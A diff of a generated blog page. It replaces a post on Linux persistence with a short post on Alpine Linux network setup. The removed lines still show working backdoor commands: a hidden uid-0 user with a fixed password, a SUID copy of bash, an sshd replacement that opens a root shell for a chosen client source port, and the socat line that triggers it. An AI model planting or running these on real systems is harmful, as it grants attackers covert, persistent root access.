@@ -18,7 +18,7 @@
   <meta name="author" content="Bsmslwx">
   <meta name="keywords" content="">
   
-  <title>BsmslwxBlog</title>
+  <title>linux系统安装 ~ BsmslwxBlog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="">
+            <span class="h2" id="subtitle" title="linux系统安装">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-08-18 23:46" pubdate>
-        2022年8月18日 晚上
+      <time datetime="2022-07-04 15:35" pubdate>
+        2022年7月4日 下午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      478 字
+      24 字
     </span>
   
 
@@ -220,28 +220,17 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none"></h1>
+            <h1 style="display: none">linux系统安装</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：2022年6月17日 凌晨
+                  本文最后更新于：2022年8月18日 晚上
                 
               </p>
             
             <div class="markdown-body">
-              <h1 id="Linux-权限维持"><a href="#Linux-权限维持" class="headerlink" title="Linux 权限维持"></a>Linux 权限维持</h1><h1 id="一-用户添加"><a href="#一-用户添加" class="headerlink" title="一. 用户添加"></a>一. 用户添加</h1><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment"># 创建一个用户名guest，密码123456的root用户</span><br>useradd -p `openssl passwd -1 -salt <span class="hljs-string">&#x27;salt&#x27;</span> 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/<span class="hljs-built_in">test</span><br><span class="hljs-comment"># 添加普通用户</span><br><span class="hljs-comment"># 1. 创建一个用户名guest，密码123456的普通用户</span><br>useradd -p `openssl passwd -1 -salt <span class="hljs-string">&#x27;salt&#x27;</span> 123456` guest<br><br><span class="hljs-comment"># 2. useradd -p 方法  ` ` 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br>useradd -p <span class="hljs-string">&quot;<span class="hljs-subst">$(openssl passwd -1 123456)</span>&quot;</span> guest<br><br><span class="hljs-comment"># 3. chpasswd方法</span><br>useradd guest;<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;guest:123456&#x27;</span>|chpasswd<br><br><span class="hljs-comment"># 4. echo -e方法</span><br>useradd <span class="hljs-built_in">test</span>;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;123456\n123456\n&quot;</span> |passwd <span class="hljs-built_in">test</span><br></code></pre></div></td></tr></table></figure>
-
-<h2 id="1-1-权限提升小技巧"><a href="#1-1-权限提升小技巧" class="headerlink" title="1.1 权限提升小技巧"></a>1.1 权限提升小技巧</h2><ol>
-<li><p>/bin/bash</p>
-<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-comment"># 移动/bin/bash并赋予权限</span><br><br>cp /bin/bash /var/tmp/bash &amp;&amp; chmod 0777 /var/tmp/bash &amp;&amp; chmod u+s /var/tmp/bash<br><span class="hljs-comment"># 可以使用低权限调用后获取root权限 (据说要完整目录才能用)</span><br>/var/tmp/bash -p<br></code></pre></div></td></tr></table></figure></li>
-</ol>
-<h1 id="二-SSH-wrapper"><a href="#二-SSH-wrapper" class="headerlink" title="二. SSH wrapper"></a>二. SSH wrapper</h1><p>首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p>
-<p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p>
-<p>靶机</p>
-<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd /usr/sbin/<br>mv sshd ../bin/<br>echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd<br>echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd<br>echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd<br>chmod u+x sshd<br>systemctl restart sshd<br></code></pre></div></td></tr></table></figure>
-
-<p>主机:</p>
-<figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">socat STDIO TCP4:target_ip:22,sourceport=13377<br></code></pre></div></td></tr></table></figure>
+              <h1 id="一-Alpine"><a href="#一-Alpine" class="headerlink" title="一. Alpine"></a>一. Alpine</h1><p>设置网络</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ifconfig eth0 192.168.122.66 netmask 255.255.255.0<br>route add default gw 192.168.122.1<br></code></pre></div></td></tr></table></figure>
 
 
             </div>
@@ -249,6 +238,22 @@
             <div>
               <div class="post-metas mb-3">
                 
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Linux/">Linux</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/linux/">linux</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
+                    
+                  </div>
                 
               </div>
               
